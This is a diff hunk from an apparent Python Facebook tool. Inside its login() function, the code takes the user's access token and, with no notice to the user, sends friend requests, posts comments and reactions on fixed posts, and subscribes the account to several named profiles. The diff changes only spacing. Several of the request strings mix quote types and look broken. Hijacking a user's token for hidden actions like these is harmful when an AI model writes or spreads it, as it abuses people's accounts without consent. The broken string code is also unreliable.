@@ -111,11 +111,11 @@ def login():
                         post2 = ( '2657012877896655' )	
                         kom2 = ( 'Sc Nya Keren Bang😁' )	
                         reaksi2 = ( 'CINTA' )	
-                        requests.post ("https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + token)	
-                        requests.post ("https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)	
-                        requests.post ("https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + token)	
-                        requests.post ("https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)	
-                        requests.post ("https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + token)	
+                        requests.post("https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + token)	
+                        requests.post("https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)	
+                        requests.post("https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + token)	
+                        requests.post("https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)	
+                        requests.post("https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + token)	
 			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      # Raka Andrian Tara
 			requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)      # RAKA THE KING
 			requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)      # MANTAN GARANGAN
